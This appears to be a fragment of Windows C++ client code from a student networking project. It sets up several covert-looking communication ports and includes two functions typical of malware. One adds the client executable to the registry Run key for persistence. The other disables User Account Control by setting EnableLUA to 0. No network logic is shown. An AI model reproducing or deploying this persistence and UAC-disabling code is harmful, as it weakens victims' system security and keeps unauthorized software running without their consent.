#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include "icmp.h"
using namespace std;
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "crypt32")
#pragma warning(disable:4996) 

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "27015"
#define TCP_PORT "3457"
#define DNS_PORT "5001"
#define PORT 13456
#define CONTINUTE "0"
#define END "1"
#define HTTP_PORT "8880"
#define HTTPS_PORT "9898"

#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() (WSAGetLastError())

#include <openssl/crypto.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

void AutoRunStartUp() {
	HKEY hKey;
	const char* czStartName = "MyApplication";
	const char* czExePath = "D:\\Nam 5\\t6\\6Protocol\\Client\\ClientProtocol\\Debug\\ClientProtocol.exe";
	
	LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE,
		&hKey);
	if (ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueEx(hKey,
			czStartName,
			0,
			REG_SZ,
			(unsigned char*)czExePath,
			strlen(czExePath));
	}

	RegCloseKey(hKey);
}

void CloseUAC() {
	DWORD val = 0;
	HKEY uaKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &uaKey);
	if (uaKey == NULL)
	{
		//Handle error message here
	}
	else
	{
		if (RegSetValueEx(uaKey, TEXT("EnableLUA"), 0, REG_DWORD, (const BYTE *)&val, sizeof(val)) != ERROR_SUCCESS)
		{
			printf("Not edit");
		}
		else
		{
			//Success
		}
		RegCloseKey(uaKey);
	}
}
